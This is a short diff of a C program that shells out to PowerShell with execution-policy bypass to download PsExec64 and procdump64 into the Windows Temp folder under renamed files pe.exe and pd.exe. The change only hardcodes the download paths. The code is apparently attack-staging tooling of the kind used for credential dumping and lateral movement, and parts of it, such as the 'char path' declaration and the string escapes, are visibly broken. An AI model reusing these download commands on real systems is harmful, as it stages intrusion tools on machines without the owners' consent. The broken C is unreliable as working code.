@@ -6,9 +6,9 @@ int main(int c, char *argv[]){
 	char path = "C:\\Windows\\Temp\";
 
 	printf("exe executed, downloading pe.exe\n");
-	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','%s\\pe.exe')) } \", path);
+	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','C:\\Windows\\Temp\\pe.exe')) } \"");
 	printf("ps.exe downloaded, downloading pd.exe\n");
-	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/procdump64.exe','%s\\pd.exe')) } \", path);
+	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/procdump64.exe','C:\\Windows\\Temp\\pd.exe')) } \"");
 	printf("pd.exe downloaded");
 
 
